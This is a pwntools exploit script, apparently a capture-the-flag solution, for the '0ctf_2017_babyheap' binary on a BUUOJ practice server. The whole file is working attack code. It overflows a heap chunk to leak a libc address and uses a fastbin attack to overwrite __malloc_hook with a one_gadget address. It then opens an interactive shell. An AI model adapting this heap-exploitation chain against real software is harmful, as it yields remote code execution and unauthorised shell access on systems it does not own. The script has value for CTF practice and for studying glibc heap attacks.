#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda x:p.sendline(x)
sd = lambda x:p.send(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()
context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process("./0ctf_2017_babyheap")
	elf = ELF("./0ctf_2017_babyheap")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	p = remote("node3.buuoj.cn",28975)
	elf = ELF("./0ctf_2017_babyheap")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

def menu(cmd):
    sla("Command: ",str(cmd))

def add(size):
    menu(1)
    sla("Size: ",str(size))
    ru("Allocate Index ")
    idx = rv(1)
    return idx

def fill(idx,size,content):
    menu(2)
    sla("Index: ",str(idx))
    sla("Size: ",str(size))
    sla("Content: ",content)

def free(idx):
    menu(3)
    sla("Index: ",str(idx))

def dump(idx):
    menu(4)
    sla("Index: ",str(idx))

###leak libc###
add(0x60)#0
add(0x60)#1
add(0x60)#2
add(0x60)#3

payload = 'A' * 0x60 + p64(0) + '\xe1'
fill(0,len(payload),payload)
free(1)

add(0x60)
dump(2)

main_arena = u64(ru('\x7f')[-6:].ljust(8,'\x00')) - 88
libc_base = main_arena - 0x3c4b20

###fastbin attack###
malloc_hook = libc_base + libc.symbols['__malloc_hook']
one_gadget = libc_base + 0x4526a

add(0x60)#4 and 2-----make another pointer to point chunk2
free(4)


payload = p64(malloc_hook-0x23)
fill(2,len(payload),payload)

add(0x60)#4
add(0x60)#5
payload = 'A' * 0x13 + p64(one_gadget)
fill(5,len(payload),payload)


###get shell###
ia()